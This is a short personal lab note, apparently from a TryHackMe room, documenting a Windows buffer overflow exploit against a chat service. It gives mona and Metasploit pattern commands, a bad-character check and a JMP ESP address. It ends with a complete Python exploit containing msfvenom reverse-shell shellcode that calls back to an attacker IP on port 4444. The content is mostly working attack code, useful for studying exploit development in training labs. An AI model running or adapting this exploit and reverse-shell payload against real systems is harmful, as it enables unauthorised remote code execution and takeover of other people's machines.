#THM #Windows #buffOverflow 

#### Setup mona

```
!mona config -set workingfolder c:\mona\%p
```

#### Find offset

```bash
msf-pattern_create -l 5000
```

```py
import socket  
  
ip = "127.0.0.1"  
port = 9999  
offset = 0  
overflow = "A" * offset  
retn = ""  
padding = ""  
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab..."  
postfix = ""  
buffer = overflow + retn + padding + payload + postfix  
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
username = b"give me shell pls"  
try:  
 s.connect((ip, port))  
 s.recv(1024)  
 s.send(username)  
 s.recv(1024)  
 print("Sending evil buffer...")  
 s.send(bytes(buffer + "\r\n", "latin-1"))  
 print("Done!")  
except:  
 print("Could not connect.")
```

```bash
msf-pattern_offset -l 5000 -q 31704330
[*] Exact match at offset 2012
```

#### Finding Bad Characters

```py
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

```
!mona bytearray -b "\x00"
```

```
!mona compare -f C:\mona\chatserver\bytearray.bin -a <ESP addr>
```

* no bad chars except \x00

#### Find jmp point

```
!mona jmp -r esp -cpb "\x00"

625014DF -> \xdf\x14\x50\x62
```

#### Payload

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.57.111 LPORT=4444 EXITFUNC=thread -b "\x00" -f py -v payload
```

#### Exploit

```py
import socket  
  
ip = "10.10.171.191"  
port = 9999  
offset = 2012  
overflow = b"A" * offset  
retn = b"\xdf\x14\x50\x62"  
padding = b"\x90" * 64  
payload = b""  
payload += b"\xba\xf1\x94\xd6\xb9\xd9\xcc\xd9\x74\x24\xf4\x58"  
payload += b"\x31\xc9\xb1\x52\x31\x50\x12\x03\x50\x12\x83\x19"  
payload += b"\x68\x34\x4c\x25\x79\x3b\xaf\xd5\x7a\x5c\x39\x30"  
payload += b"\x4b\x5c\x5d\x31\xfc\x6c\x15\x17\xf1\x07\x7b\x83"  
payload += b"\x82\x6a\x54\xa4\x23\xc0\x82\x8b\xb4\x79\xf6\x8a"  
payload += b"\x36\x80\x2b\x6c\x06\x4b\x3e\x6d\x4f\xb6\xb3\x3f"  
payload += b"\x18\xbc\x66\xaf\x2d\x88\xba\x44\x7d\x1c\xbb\xb9"  
payload += b"\x36\x1f\xea\x6c\x4c\x46\x2c\x8f\x81\xf2\x65\x97"  
payload += b"\xc6\x3f\x3f\x2c\x3c\xcb\xbe\xe4\x0c\x34\x6c\xc9"  
payload += b"\xa0\xc7\x6c\x0e\x06\x38\x1b\x66\x74\xc5\x1c\xbd"  
payload += b"\x06\x11\xa8\x25\xa0\xd2\x0a\x81\x50\x36\xcc\x42"  
payload += b"\x5e\xf3\x9a\x0c\x43\x02\x4e\x27\x7f\x8f\x71\xe7"  
payload += b"\x09\xcb\x55\x23\x51\x8f\xf4\x72\x3f\x7e\x08\x64"  
payload += b"\xe0\xdf\xac\xef\x0d\x0b\xdd\xb2\x59\xf8\xec\x4c"  
payload += b"\x9a\x96\x67\x3f\xa8\x39\xdc\xd7\x80\xb2\xfa\x20"  
payload += b"\xe6\xe8\xbb\xbe\x19\x13\xbc\x97\xdd\x47\xec\x8f"  
payload += b"\xf4\xe7\x67\x4f\xf8\x3d\x27\x1f\x56\xee\x88\xcf"  
payload += b"\x16\x5e\x61\x05\x99\x81\x91\x26\x73\xaa\x38\xdd"  
payload += b"\x14\xdf\xb7\xe4\x8b\xb7\xc5\x16\x45\x14\x43\xf0"  
payload += b"\x0f\xb4\x05\xab\xa7\x2d\x0c\x27\x59\xb1\x9a\x42"  
payload += b"\x59\x39\x29\xb3\x14\xca\x44\xa7\xc1\x3a\x13\x95"  
payload += b"\x44\x44\x89\xb1\x0b\xd7\x56\x41\x45\xc4\xc0\x16"  
payload += b"\x02\x3a\x19\xf2\xbe\x65\xb3\xe0\x42\xf3\xfc\xa0"  
payload += b"\x98\xc0\x03\x29\x6c\x7c\x20\x39\xa8\x7d\x6c\x6d"  
payload += b"\x64\x28\x3a\xdb\xc2\x82\x8c\xb5\x9c\x79\x47\x51"  
payload += b"\x58\xb2\x58\x27\x65\x9f\x2e\xc7\xd4\x76\x77\xf8"  
payload += b"\xd9\x1e\x7f\x81\x07\xbf\x80\x58\x8c\xdf\x62\x48"  
payload += b"\xf9\x77\x3b\x19\x40\x1a\xbc\xf4\x87\x23\x3f\xfc"  
payload += b"\x77\xd0\x5f\x75\x7d\x9c\xe7\x66\x0f\x8d\x8d\x88"  
payload += b"\xbc\xae\x87"  
buffer = overflow + retn + padding + payload  
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
username = b"give me shell pls"  
try:  
	 s.connect((ip, port))  
	 s.recv(1024)  
	 s.send(username)  
	 s.recv(1024)  
	 print("Sending evil buffer...")  
	 s.send(buffer + b"\r\n")  
	 print("Done!")  
except:  
 	print("Could not connect.")
```